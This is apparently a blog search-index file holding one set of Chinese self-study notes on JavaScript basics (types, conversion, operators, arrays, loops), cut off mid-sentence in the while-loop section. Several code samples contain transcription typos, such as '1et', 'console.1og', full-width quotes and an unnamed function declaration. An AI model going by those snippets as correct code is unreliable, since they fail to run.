<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>JS基础自学了解</title>
      <link href="/2020/10/30/js-ji-chu/"/>
      <url>/2020/10/30/js-ji-chu/</url>
      
        <content type="html"><![CDATA[<h2 id="第一章-走进JavaScript"><a href="#第一章-走进JavaScript" class="headerlink" title="第一章 走进JavaScript"></a>第一章 走进JavaScript</h2><h3 id="1-1认识JavaScript"><a href="#1-1认识JavaScript" class="headerlink" title="1.1认识JavaScript"></a>1.1认识JavaScript</h3><p>主要由三部分组成</p><ol><li>核心（ECMAScript）</li><li>文档对象模型（DOM）</li><li>浏览器对象模型（BOM）</li></ol><h4 id="核心"><a href="#核心" class="headerlink" title="核心"></a>核心</h4><p><code>ECMASCript</code>规定了这门语言的基本组成部分，主要由以下组成</p><ul><li>语法</li><li>类型</li><li>语句</li><li>关键字</li><li>保留字</li><li>操作符</li><li>对象</li></ul><p>有了这些基本组成部分，<code>js</code>就可以完成基本的<strong>逻辑以及数据处理</strong></p><h4 id="文档对象模型（DOM）"><a href="#文档对象模型（DOM）" class="headerlink" title="文档对象模型（DOM）"></a>文档对象模型（DOM）</h4><p>其功能简单来说就是获取我们写的所有的<code>HTML</code>标签，并给标签添加或者删除样式，并可以给标签添加事件（例如点击或者拖动等）。这些功能的实现是基于下面几种接口的：</p><ul><li><strong>DOM遍历和范围：</strong>可以找到页面中所有的标签</li><li><strong>DOM事件：</strong>例如给某个图片添加拖动事件，使图片可以随意拖动</li><li><strong>DOM样式：</strong>可以改变页面中所有元素的样式</li></ul><h4 id="浏览器对象模型（BOM）"><a href="#浏览器对象模型（BOM）" class="headerlink" title="浏览器对象模型（BOM）"></a>浏览器对象模型（BOM）</h4><p><code>BOM</code>只会处理跟浏览器相关的东西，比如：</p><ul><li>弹出新窗口功能</li><li>移动、缩放、关闭浏览器窗口的功能</li><li>给用户提供显示器分辨率的功能</li><li>提供浏览器信息</li></ul><h3 id="1-2在HTML中使用JavaScript"><a href="#1-2在HTML中使用JavaScript" class="headerlink" title="1.2在HTML中使用JavaScript"></a>1.2在HTML中使用JavaScript</h3><h4 id="JavaScript的书写位置"><a href="#JavaScript的书写位置" class="headerlink" title="JavaScript的书写位置"></a><code>JavaScript</code>的书写位置</h4><p>与CSS类似，分为HTML内部和外部</p><h4 id="JavaScript写在HTML内部"><a href="#JavaScript写在HTML内部" class="headerlink" title="JavaScript写在HTML内部"></a><code>JavaScript</code>写在<code>HTML</code>内部</h4><ol><li>使用<code>script</code>标签嵌入<code>JavaScript</code></li></ol><p><code>&lt;script&gt;&lt;/script&gt;</code>标签可以将<code>JavaScript</code>代码嵌入到<code>HTML</code>内部，方式如下</p><pre><code>// script标签嵌入JavaScript代码&lt;script&gt;    // JavaScript代码    let name = "Bob";    function(){        console.log("我的名字叫："+name);    }&lt;/script&gt;</code></pre><ol start="2"><li>注意<code>script</code>标签在<code>HTML</code>文件中的位置</li></ol><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;  &lt;head&gt;    &lt;meta charset="UTF-8" /&gt;    &lt;title&gt;Document&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;!-- 正常的html标签一定要写在script标签的前面 --&gt;    &lt;div&gt;&lt;/div&gt;    &lt;!-- 在body标签的内部并在末尾 --&gt;    &lt;script&gt;&lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><blockquote><p><code>script</code>标签在<code>HTML</code>文件中的位置很随意，可以说写在哪里都无所谓，但是在学习<code>JavaScript</code>的<code>DOM</code>的时候，如果不注意<code>script</code>标签的址位，会出现意想不到的报错</p></blockquote><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;案例&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;!-- 正常的html标签一定要写在script标签的前面 --&gt;    &lt;div&gt;&lt;/div&gt;    &lt;!-- 在body标签的内部并在末尾 --&gt;    &lt;script&gt;      //JavaScript代码    &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="JavaScript写在HTML外部"><a href="#JavaScript写在HTML外部" class="headerlink" title="JavaScript写在HTML外部"></a><code>JavaScript</code>写在<code>HTML</code>外部</h4><p>JavaScript代码写在xxx.js文件中，然后由引入标签去引入即可</p><p>这里引入的是script标签，不一样的是在标签上多了一个<code>src</code>参数</p><p>方式如下：<br><code>&lt;script src='index.js'&gt;&lt;/script&gt;</code></p><p>案例：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;案例&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;!-- 写在body的末尾 --&gt;    &lt;script src="index.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="1-3JavaScript入门"><a href="#1-3JavaScript入门" class="headerlink" title="1.3JavaScript入门"></a>1.3JavaScript入门</h3><h4 id="JavaScript注释"><a href="#JavaScript注释" class="headerlink" title="JavaScript注释"></a>JavaScript注释</h4><p>包括单行注释可块级注释</p><p>单行注释：</p><pre><code>// </code></pre><p>多行注释：</p><pre><code>/** 注释*/</code></pre><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><p>字符串就是用引号引起来的，可以是单引号也可以是双引号</p><h4 id="console访问控制台"><a href="#console访问控制台" class="headerlink" title="console访问控制台"></a>console访问控制台</h4><p>JavaScript的输出在控制台中显示</p><pre><code>&lt;script&gt;console.log("Hello World");&lt;/script&gt;</code></pre><p>console是访问控制台，log()表示控制台输出信息</p><p>注意，在index.js文件中写JavaScript代码不需要加script标签，只有在HTML代码中才需要加script标签</p><h4 id="模板字符串"><a href="#模板字符串" class="headerlink" title="模板字符串"></a>模板字符串</h4><p>如果要将字符串和变量拼接起来，要用加号去拼接</p><pre><code>let firstName = '胡';let lastName = '雪岩';let say = '大家好，我姓' + firstName + '，名' + lastName;console.log(say);</code></pre><p>此时我们可以用反引号和占位符$来插入变量，我们改造如上代码为</p><pre><code>let firstName = '胡';let lastName = '雪岩';let say = `大家好，我姓${firstName}，名${lastName}`;console.log(say);</code></pre><p>案例：</p><pre><code>let number1 = 20;let number2 = 10;console.log(`两个数的和是：${number1 + number2} 两个数的差是：${number1 - number2} 。`);</code></pre><h4 id="三元字符串"><a href="#三元字符串" class="headerlink" title="三元字符串"></a>三元字符串</h4><p>案例：</p><pre><code>let str = `这里是${false ? '浙江' : `江苏-${true ? '南京' : '常州'}`}`;console.log(str); // 这里是江苏-南京</code></pre><p>使用场景：</p><pre><code>// 定义屏幕的宽度，当然这个宽度是根据window的api去获取的let screen = 760;// 判断屏幕是大屏还是小屏，这里我们认为大于760px的就是大屏function isLargeScreen() {  return screen &gt; 800;}// 定义元素的排列方式，大屏row排列，小屏column排列// 具体什么排列方式，是根据屏幕大小决定的let item = {  isCollapsed: screen &gt; 800,};// 这里我们就要根据上面的信息来动态的获取类名（多个）const classes = `header ${  isLargeScreen() ? '' : `icon-${item.isColumn ? 'column' : 'row'}`}`;console.log(classes);</code></pre><p>使用场景二</p><pre><code>let htmlCode = `    &lt;img src='' /&gt;    ${      true        ? `&lt;img src='https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=1906469856,4113625838&amp;fm=26&amp;gp=0.jpg' /&gt;`        : `&lt;img src='' /&gt;`    }`;console.log(htmlCode);// &lt;img src='' /&gt;//    &lt;img src='https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=1906469856,4113625838&amp;fm=26&amp;gp=0.jpg' /&gt;</code></pre><h2 id="第二章-基础数据类型"><a href="#第二章-基础数据类型" class="headerlink" title="第二章 基础数据类型"></a>第二章 基础数据类型</h2><h3 id="2-1变量"><a href="#2-1变量" class="headerlink" title="2.1变量"></a>2.1变量</h3><p>格式：</p><p><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-4-HTML-CSS/1/2j/%E5%8F%98%E9%87%8F%E8%A7%A3%E9%87%8A.png" alt="image"></p><blockquote><p>注意：let声明变量的时候，不能重复声明同名变量</p></blockquote><p>例如：</p><pre><code>let number = 20;let number = 30;</code></pre><p><strong>使用const定义变量</strong><br><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-4-HTML-CSS/1/2j/const.png" alt="image"></p><p>异同点：</p><ul><li>let定义的变量可以多次重新赋值而const只允许进行一次赋值</li><li>let定义变量的时候，可以不赋予初值，const必须赋予初值，否则会报错</li></ul><p>案例：</p><pre><code>const school = '杭州一中';let name1 = '李天宇';let name2 = '刘芳';let name3 = '李锐';let age1 = 12;let age2 = 13;let sex1 = '男';let sex2 = '女';let class1 = '六年级三班';let class2 = '六年级四班';console.log("姓名\t年龄\t\t性别\t\t班级\t\t\t\t学校\n");console.log(`${name1}\t${age1}\t\t${sex1}\t\t${class1}\t\t\t\t${school}\n`);console.log(`${name2}\t${age2}\t\t${sex2}\t\t${class1}\t\t\t\t${school}\n`);console.log(`${name3}\t${age2}\t\t${sex1}\t\t${class2}\t\t\t\t${school}\n`);</code></pre><h3 id="2-2数值类型"><a href="#2-2数值类型" class="headerlink" title="2.2数值类型"></a>2.2数值类型</h3><p>常见的数值类型有整数、浮点数盒NaN</p><h4 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h4><p>列举十六进制：</p><pre><code>let number1 = 0x010; // 十六进制的16let number2 = 0x11; // 十六进制的17let number3 = 0x12; // 十六进制的18</code></pre><h4 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h4><p>常见：</p><pre><code>let floatNumber1 = 2.0;let floatNumber2 = 0.4;let floatNumber3 = .2; // 正确，但是不推荐</code></pre><p>科学计数法：</p><pre><code>let bigNumber = 9.43e7; // 等于94300000let smallNumber = 3e-7; // 等于0.0000003</code></pre><p>浮点数精度丢失现象：</p><p>例如，0.1＋0.2的结果不是0.3</p><pre><code>let number1 = 0.1;let number2 = 0.2;console.log(number1 + number2); // 0.30000000000000004</code></pre><p>因此以后我们不要使用此种条件判断</p><pre><code>if (a + b == 0.3) {  console.log('输出成功');}</code></pre><p><strong>NaN</strong></p><p>即非数值</p><p>简单来说，就是两个变量执行了一个运算,例如+ - * / 当中的一种，返回的结果仍然是数字类型，但是执行的数学运算没有成功.例如: </p><pre><code>let a = 'number';let b = 10;let c = a / b;console.log(c); // NaNconsole.log(typeof c); // number</code></pre><blockquote><p>上面的typeof是判断类型的，最后返回的number表示的是数字类型</p></blockquote><p>回头看一下最开始的定义</p><ol><li>执行了一个运算这里执行了除法运算</li><li>返回的结果仍然是数字类型,可以从输出结果看是number类型</li><li>执行的数学运算没有成功,本案例中一一个字符串除以一个数字，的确是无法进行运算的.</li></ol><p>通过这个定义我们还可以知道其他的一些出现 NaN的情况，如:</p><ol><li>0/0</li><li>字符串乘以数字</li><li>NaN<br>和任何数进行运算例如</li></ol><h3 id="2-3类型转换-字符串拼接"><a href="#2-3类型转换-字符串拼接" class="headerlink" title="2.3类型转换/字符串拼接"></a>2.3类型转换/字符串拼接</h3><p>类型转换主要包括<strong>隐式转换和强制类型转换</strong></p><h4 id="隐式转换"><a href="#隐式转换" class="headerlink" title="隐式转换"></a>隐式转换</h4><ul><li><strong>数字字符串加数字,数字隐式转换为字符串</strong></li></ul><pre><code>console.log(20+'20'); // 2020// 调换位置亦可console.log('20'+20); // 2020</code></pre><ul><li><strong>数字字符串与数字做非加法运算,字符串隐式转换为数字</strong></li></ul><pre><code>console.log('20'-10); // 10console.log(10*'10'); // 100console.log(10/'2'); // 5</code></pre><ul><li><strong>数字字符串与数字字符串做非加法运算隐式转换为数字</strong></li></ul><pre><code>console.log('20'-'10'); // 10console.log('20'/'10'); // 2console.log('20'*'10'); // 200</code></pre><h4 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h4><p>强制类型转换我们需要学习两个,parselnt(将小数字符串、整数字符串或者小数转换为整数)、parseFloat(将小数字符 串转换为小数).</p><p>parselnt</p><ul><li>整数字符串转换为整数</li></ul><pre><code> let number = '20';//  将number转换为整数类型let converNumber = parseInt(number);console.log(converNumber); // 20// 判断转换后的数据类型console.log(typeof converNumber); // number</code></pre><ul><li>小数字符串转换为整数</li></ul><pre><code>let number = '20.5';let converNumber = parseInt(number);console.log(converNumber); // 20  不足21一律按照20算console.log(typeof converNumber); // number</code></pre><ul><li>小数转换为整数</li></ul><pre><code>let number = 20.5;let converNumber = parseInt(number);console.log(converNumber); // 20  </code></pre><p>parseFloat</p><p>将小数字符串转换为小数</p><pre><code>let number = '20.9';let converNumber = parseFloat(number);console.log(converNumber); // 20.9console.log(typeof converNumber); // number</code></pre><h4 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h4><ul><li>字符串拼接使用的符号是+ (加号)</li><li>字符串用引号引起来，单双引不做要求,但是要对应，不能是前半部分单引号,后半部分双引号，如(“).</li><li>变量名不能用引号,如果变量名在字符串中间,可以用加号和引号区分开，例如(“我的名字: “+name +<br>. “,谢谢”).</li></ul><pre><code>console.log('转换后的结果是：' + converNumber);console.log('转换后的数字类型是：' + typeof converNumber + '类型');</code></pre><p>字符串拼接也可以在变量中使用</p><pre><code>let age = 20;let name = '小李子';let output = '我叫：'+name+',今年'+age+'岁了';console.log(output);</code></pre><h3 id="2-4运算符"><a href="#2-4运算符" class="headerlink" title="2.4运算符"></a>2.4运算符</h3><h4 id="相等-全等"><a href="#相等-全等" class="headerlink" title="相等/全等"></a>相等/全等</h4><pre><code>let number1 = '45';let number2 = 45;console.log(number1 == number2); // true</code></pre><p>我们之前学习过隐式类型转换,在这里做比较的时候会首先将45’转换为45,然后再去跟number2比较，这就等同于下面的代码:</p><pre><code>let number1 = 45;let number2 = 45;console.log(number1 == number2);</code></pre><p>如果是全等就不一样了</p><pre><code>let number1 = '45';let number2 = 45;console.log(number1 === number2); // false</code></pre><p>由于相等错在类型转换问题，为了保持代码中数据类型的完整性推荐使用全等</p><h4 id="自增自减"><a href="#自增自减" class="headerlink" title="自增自减"></a>自增自减</h4><p>案例：</p><pre><code>let balloon = 10;let money = 0;// 卖出去第一个balloon--; // 9money++; // 1// 卖出去第二个balloon--; // 8money++; // 2// .....// 以此类推</code></pre><pre><code>let balloon = 10;let money = 0;balloon--;money++;console.log('第一次递减后的结果：' + balloon);console.log('第一次递增后的结果：' + money);balloon--;money++;console.log('第二次递减后的结果：' + balloon);console.log('第二次递增后的结果：' + money);</code></pre><h2 id="第三章-布尔类型-条件判断"><a href="#第三章-布尔类型-条件判断" class="headerlink" title="第三章 布尔类型/条件判断"></a>第三章 布尔类型/条件判断</h2><h3 id="3-1布尔类型"><a href="#3-1布尔类型" class="headerlink" title="3.1布尔类型"></a>3.1布尔类型</h3><h4 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h4><p>你可以把true、false理解为一个值，它和字符串、数值一样都是作为一个值来赋给变量的，例如:</p><pre><code>let flag = true;let allow = false;</code></pre><p>上面的代码表示定义了两个变量分别赋值了<br><code>true</code>、<code>false</code></p><h4 id="布尔运算"><a href="#布尔运算" class="headerlink" title="布尔运算"></a>布尔运算</h4><h5 id="基本布尔运算"><a href="#基本布尔运算" class="headerlink" title="基本布尔运算"></a>基本布尔运算</h5><pre><code>let number1 = 45;let number2 = 45;let isEqual = number1 === number2;console.log(isEqual);</code></pre><pre><code>let a = 12;let b = 3;console.log('a &gt; b结果：' + (a &gt; b)); // trueconsole.log('a &gt;= b 结果：' + (a &gt;= b)); // trueconsole.log('a &lt; b 结果：' + (a &lt; b)); // falseconsole.log('a &lt;= b 结果：' + (a &lt;= b)); // falseconsole.log('a !== b 结果：' + (a !== b)); // truelet c = a &gt; b;// 非,表示取反,如果变量值是true,取反后是falseconsole.log('!c 结果：' + !c); // false</code></pre><h5 id="两种布尔运算的简便写法"><a href="#两种布尔运算的简便写法" class="headerlink" title="两种布尔运算的简便写法"></a>两种布尔运算的简便写法</h5><table><thead><tr><th>数据类型</th><th>转换为true的值</th><th>转换为false的值</th></tr></thead><tbody><tr><td>字符串</td><td>任何非空字符串</td><td>“”(空字符串)</td></tr><tr><td>数字</td><td>任何非零数字</td><td>0</td></tr></tbody></table><p>例子：</p><pre><code>let str = 'Bob';if (str) {  console.log('代码被执行了'); // 会被执行}// 上面代码等同于if (str !== '') {  console.log('代码被执行了'); // 会被执行}</code></pre><h5 id="逻辑或-逻辑与"><a href="#逻辑或-逻辑与" class="headerlink" title="逻辑或/逻辑与"></a>逻辑或/逻辑与</h5><pre><code>let switch1 = true; // 表示开关1是闭合的let switch2 = false; // 表示开关2是打开的let result = switch1 || switch2; // 如果结果是true,就表示灯亮console.log(result);</code></pre><pre><code>let switch1 = true; // 表示开关1是闭合的let switch2 = false; // 表示开关2是打开的let result = switch1 &amp;&amp; switch2; // 如果结果是false,就表示灯灭console.log(result);</code></pre><h3 id="3-2条件判断"><a href="#3-2条件判断" class="headerlink" title="3.2条件判断"></a>3.2条件判断</h3><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><p>不再举例</p><h4 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h4><pre><code>let weather = 'rain';switch (weather) {  case 'snow':    console.log('堆雪人');    break;  case 'windy':    console.log('呆在家里');    break;  case 'rain':    console.log('雨中漫步');    break;  default:    console.log('工作');    break;}</code></pre><h2 id="第四章-数组"><a href="#第四章-数组" class="headerlink" title="第四章 数组"></a>第四章 数组</h2><h3 id="4-1认识数组"><a href="#4-1认识数组" class="headerlink" title="4.1认识数组"></a>4.1认识数组</h3><p>在<code>JavaScript</code>中,数组的表示方法是一个方括号<code>( [] )</code></p><p>数组内容与内容之间要用逗号隔开</p><pre><code>[1,2,3,4]</code></pre><p>数组有一个很有意思的特性就是它可以存放不同类型的值,例如下面的数<br>组中，就存放了各种不同类型的数据(也可以叫值).</p><pre><code>[1,'第一名',true]</code></pre><p>更可以存放数组~</p><pre><code>[1,'第一名',true,[2,'第二名',false]]</code></pre><p>存储数组的变量与存储值的变量是一样的， 因为你完全可以将数组理解为一<br>个“胖”一点的变量,下面我们将上面的数组存储在一个变量中:</p><pre><code>let arr = [1,'第一名',true,[2,'第二名',false]];</code></pre><p>另一种创建数组的方式：</p><pre><code>// 创建一个空数组并赋值let arr = new Array();// 创建一个有内容的数组let arr2 = new Array(1,2,'arr');</code></pre><h4 id="数组的索引："><a href="#数组的索引：" class="headerlink" title="数组的索引："></a>数组的索引：</h4><pre><code>// 定义数组let arr = ['张三','李四','王五','Lisa'];// 定义一个变量来接收取到的值let str = arr[2];// 输出取到的值console.log(str); // 王五</code></pre><p>修改值</p><pre><code>let arr = ['张三','李四','王五','Lisa'];// 修改'王五'为'Tom'arr[2] = 'Tom';// 输出数组console.log(arr);</code></pre><p>其他案例：</p><pre><code>let arr = ['张三','李四','王五','Lisa'];// 修改值arr[0] = 'Three';arr[1] = 'Four';arr[2] = 'Five';arr[3] = '丽莎';console.log(arr);// 添加值arr[4] = 'Polly';console.log(arr);</code></pre><h3 id="4-2数组元素的操作（增删改查）"><a href="#4-2数组元素的操作（增删改查）" class="headerlink" title="4.2数组元素的操作（增删改查）"></a>4.2数组元素的操作（增删改查）</h3><h4 id="增"><a href="#增" class="headerlink" title="增"></a>增</h4><p>push方法：在数组末尾添加值：</p><pre><code>let schools = ['清华大学', '北京大学', '浙江大学', '同济大学'];// 在末尾添加“河海大学”schools.push('河海大学');console.log(schools); // 清华大学','北京大学','浙江大学','同济大学','河海大学'</code></pre><p>添加多个值:</p><pre><code>schools.push('河海大学');schools.push('大连理工大学');schools.push('哈尔滨工业大学');// 上述三步操作可以一次性完成schools.push('河海大学', '大连理工大学', '哈尔滨工业大学');</code></pre><blockquote><p>unshift方法（从头加）</p></blockquote><h4 id="删"><a href="#删" class="headerlink" title="删"></a>删</h4><p>删除的方法和增加的方法相对应,分为从前往后删和从后往前删除,首先要说的是从后往前删除的方法</p><p>pop方法（从后往前删除）</p><pre><code>let schools = ['清华大学', '北京大学', '浙江大学', '同济大学'];// 在末尾添加“河海大学”schools.push('河海大学');console.log(schools); // 清华大学','北京大学','浙江大学','同济大学','河海大学'// 从末尾删除一个元素schools.pop();console.log(schools); // 清华大学','北京大学','浙江大学','同济大学'</code></pre><p><strong>shift方法（从前往后删除）</strong></p><p><strong>splice方法（删除指定位置的值）</strong></p><p>splice方法在括号内可以写一个参数,也可以写两个参数,具体作用我们用案例来解释一下.</p><p>一个参数：</p><p>表示删除从指定位置开始到结束位置的所有元素并返回被删除的元素</p><pre><code>let schools = ['清华大学', '北京大学', '浙江大学', '同济大学'];// 删除从下标为1的位置到结束位置的值let deleteSchools = schools.splice(1);// 删除之后，原数组中的剩余内容console.log(schools); // ["清华大学"]// 删除的内容console.log(deleteSchools); // ["北京大学", "浙江大学", "同济大学"]</code></pre><p>两个参数：</p><pre><code>let schools = ['清华大学', '北京大学', '浙江大学', '同济大学'];// 从下标为0开始,往后数两个元素,删除let deleteSchools = schools.splice(0, 2);console.log(schools); // ['浙江大学', '同济大学']console.log(deleteSchools); // ['清华大学', '北京大学']</code></pre><h4 id="改"><a href="#改" class="headerlink" title="改"></a>改</h4><p><strong>splice方法(需改指定位置的元素)</strong></p><p>splice方法难理解一点，这里需要讲解一下，splice方法括号里需要添加三个值(也叫参数).分别代表三个意思，先来解释一下这三个值 :</p><ol><li>第一个值整数类型表示起始位置</li><li>第二个值整数类型示步长(往后选几个元素,1代表往后选1个元素)</li><li>第三个参数要替换的数组的值</li></ol><p><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-4-HTML-CSS/4/splice.png" alt="image"><br>可以看到，数组的下标不是在正下方,而是在左下角，实际上,正确的下标就是应该在左下角,下标其实类似于公交车的站点.</p><p>案例1：</p><pre><code>let schools = ['清华大学', '北京大学', '浙江大学', '同济大学'];schools.splice(2, 0, '江西理工大学');console.log(schools); //  ["清华大学", "北京大学", "江西理工大学", "浙江大学", "同济大学"]</code></pre><p>在这个案例中，splice方法的第一个参数是2,第二个参数是0，也就是从下标2开始，往后走0个步长，然后用“江西理工大学”替换这0个步长里的内容.</p><p>经过一系列操作以后，给人的感觉貌似是在”北京大学”和”浙江大学”之间添加了“江西理工大学”,其实不然，splice的意义其实还是替换的意思.</p><p>案例2：</p><pre><code>let schools = ['清华大学', '北京大学', '浙江大学', '同济大学'];schools.splice(2, 1, '江西理工大学');console.log(schools); // ["清华大学", "北京大学", "江西理工大学", "同济大学"]</code></pre><p>案例3：</p><pre><code>let schools = ['清华大学', '北京大学', '浙江大学', '同济大学'];schools.splice(2, 2, '江西理工大学');console.log(schools); // ["清华大学", "北京大学", "江西理工大学"]</code></pre><h4 id="查"><a href="#查" class="headerlink" title="查"></a>查</h4><p>只学习indexOf()</p><p>一个参数：<br>比如说我们要查询schools数组内是否有某个学校:</p><pre><code>let schools = ['清华大学', '北京大学', '浙江大学', '同济大学'];let result = schools.indexOf('大连理工');console.log(result); // -1</code></pre><blockquote><p>返回值是-1表示没找到，非-1表示找到元素的下标</p></blockquote><p>两个参数：</p><p>第一个参数是我们要找的值，第二个参数是开始寻找的位置,比如在一个参数的情况下我们来寻找“浙江大学”.</p><pre><code>let schools = ['清华大学', '北京大学', '浙江大学', '同济大学'];let result = schools.indexOf('浙江大学');console.log(result); // 2 表示“浙江大学”所在的下标为2</code></pre><p>结果是2，表示找到了。但是当使用第二个参数规定开始寻找的位置,就未必能找到了。例如:</p><pre><code>let schools = ['清华大学', '北京大学', '浙江大学', '同济大学'];let result = schools.indexOf('浙江大学', 3);console.log(result); // -1</code></pre><p>因为我们是从下标为3的位置(同济大学)开始寻找的，所以找不到。</p><p>所以，使用第二个参数的时候，一定要小心哦。</p><p>案例：</p><pre><code>let mobiles = ["华为Mate30", "华为P30", "华为nova 6 5G", "华为nova4e"]mobiles.unshift("华为Mate30 Pro");//console.log(mobiles);let deletemobiles = mobiles.splice(2,1);console.log(mobiles);</code></pre><h3 id="4-3二维数组"><a href="#4-3二维数组" class="headerlink" title="4.3二维数组"></a>4.3二维数组</h3><p>我们知道一维数组是一个方括号([]),那么二维数组就是在一维数组内继续添加方括号( [] ),即数组内部继续添加数组</p><p>我们在内部再多增加几个数组,改变一下摆放的格局，是不是就像大格子里面有小格子,小格子里面有内容?而小格子就是大格子的内容。假设数组名为arr</p><pre><code>[  [2, '第二名', false],  [2, '第二名', false],  [2, '第二名', false],];</code></pre><p>如何取值？</p><p>第一步,取出数组内部的数组</p><pre><code>1et arr2 = arr[0] ;console.1og(arr2); // [2, '第二名',false]</code></pre><p>第二步,取出arr2内部的元素,比如说我们要取出2:</p><pre><code>let number = arr2[0];console . log(number); // 2</code></pre><p>第三步，将两步合成一步:</p><pre><code>let number = arr[0][0];console.1og(number); // 2</code></pre><p>到这里我们就完成了二维数组的一次取值过程.</p><p>如何存值呢？</p><pre><code>// 定义一个一维数组let arr1 = [];// 给一维数组里面添加数据arr1[0] = '宇智波佐助';arr1[1] = '男';arr1[2] = '下忍';arr1[3] = 12;console.log(arr1); // ['宇智波佐助','男','下忍',12]// 给一维数组里面添加数据arr2 = [];arr2[0] = '春野樱';arr2[1] = '女';arr2[2] = '下忍';arr2[3] = 12;console.log(arr2); // ['春野樱','女','下忍',12]// 给一维数组里面添加数据arr3 = [];arr3[0] = '漩涡鸣人';arr3[1] = '男';arr3[2] = '下忍';arr3[3] = 12;console.log(arr3); // ['漩涡鸣人','男','下忍',12]// 将一维数组添加到另一个数组中，形成二维数组let arr = [];arr[0] = arr1;arr[1] = arr2;arr[2] = arr3;console.log(arr);// [//   ['宇智波佐助', '男', '下忍', 12],//   ['春野樱', '女', '下忍', 12],//   ['漩涡鸣人', '男', '下忍', 12],// ]</code></pre><p><code>arr[0] = [];</code>表示给一维数组里面添加数组，这一步很关键，如果不在一维数组里添加数组[]就直接使用<code>arr[0][0]</code> 会报错</p><p>因为你做的arr[0]操作获取到的数据是undefined，再去执行arr[0][0]就是无效操作了,因为没有选到数组，还做数组操作，就是错误的.</p><p>还可以使用push方法来给数组赋值</p><pre><code>let arr = [];arr.push([]);arr[0].push('宇智波佐助');arr[0].push('男');arr[0].push('下忍');arr[0].push(12);arr.push([]);arr[1].push('春野樱');arr[1].push('女');arr[1].push('下忍');arr[1].push(12);arr.push([]);arr[2].push('漩涡鸣人');arr[2].push('男');arr[2].push('下忍');arr[2].push(12);console.log(arr);</code></pre><p>根据故事的进展,宇智波佐助出逃,佐井进入了小队，所以我们需要将宇智波佐助的信息替换成佐井.<br>做法和一-维数组类似:</p><pre><code>arr[0][0] =‘佐井';arr[0][1] = :男';arr[0][2] =‘下忍';arr[0][3] = 14;</code></pre><p>或者你比较懒,可以直接一步到位:</p><pre><code>arr[0] = ['佐井’，'男’，，下忍'，14];</code></pre><p>因为这是替换了一个人，所以修改个人信息的时候，用第二种方式比较简单,大多数情况下都是变更部分信息比如说参加中忍考试以后，两个升为中忍,<br>只能去使用第一种方法来修改信息:</p><pre><code>// 修改佐助等级为中忍arr[0][2] = '中忍';// 修改春野樱等级为中忍arr[1][2] = '中忍';</code></pre><p>案例：<br>某乡村小学有三个年级，每个年级一个班，每个班有几位学生,用二维数组表示如下:<br>let school =[</p><pre><code>['胡多多'，‘孙萌’，‘李宇池'，'赵梓萱],['沈广玥’，‘彭紫阳'，‘王桢',胡家如'],['陈成’，'邹思唯’， '储正欢'，'张敏'],];</code></pre><p>从数组中取出”沈广玥”的名字，并在控制台输出</p><p>“赵梓萱”因为转学的原因，需要将她的名字去掉</p><p>在3班([“陈成”,”邹思唯”,”储正欢”,”张敏”])名单的末尾添加一个新生—”孙思宇</p><p>最后在控制台输出整个二维数组</p><pre><code>let school = [["胡多多", "孙萌", "李宇池", "赵梓萱"], ["沈广玥", "彭紫阳", "王桢", "胡家如"], ["陈成", "邹思唯", "储正欢", "张敏"]];console.log(school[1][0]);let school0 = school[0];let deleteschool = school0.splice(3);school[2].push("孙思宇");console.log(school);</code></pre><h2 id="第五章-循环"><a href="#第五章-循环" class="headerlink" title="第五章 循环"></a>第五章 循环</h2><h3 id="5-1for循环"><a href="#5-1for循环" class="headerlink" title="5.1for循环"></a>5.1for循环</h3><p>写法：<br><img src="https://document.youkeda.com/P3-4-HTML-CSS/5/1.jpg" alt="image"></p><p>我们来打印佩奇一家的所有成员：</p><pre><code>let peppaFamily = ['佩奇', '乔治', '猪妈妈', '猪爸爸'];for(let i = 0; i &lt; peppaFamily.length; i++) {  console.log(peppaFamily[i]);}// 输出:// 佩奇// 乔治// 猪妈妈// 猪爸爸</code></pre><p>其他写法：for…in和 for…of的写法</p><ol><li>for…in循环<pre><code>let peppaFamily = ['佩奇', '乔治', '猪妈妈','猪爸爸'];</code></pre></li></ol><p>for(let i in peppaFamily) {<br>  console.log(peppaFamily[i]);<br>}<br>// 输出:<br>// 佩奇<br>// 乔治<br>// 猪妈妈<br>// 猪爸爸</p><pre><code>for...in循环会访问数组中的每-项，这里的i对应数组中每一项的下标。&gt; for..in不但可以循环数组，还能循环对象。2. for..of循环</code></pre><p>let peppaFamily = [‘佩奇’, ‘乔治’, ‘猪妈妈’,’猪爸爸’];</p><p>for(let item of peppaFamily) {<br>  console.log(item);<br>}<br>// 输出:<br>// 佩奇<br>// 乔治<br>// 猪妈妈<br>// 猪爸爸</p><pre><code>for..of循环也会访问数组中的每一项, 这里的item对应数组中每一项。 &gt; 两者的区别:for..in循环遍历的结果是数组元素的下标，而for..of遍历的结果是元素的值。### 5.2#### while循环![image](https://document.youkeda.com/P3-4-HTML-CSS/5/2.jpg)初始条件: i = 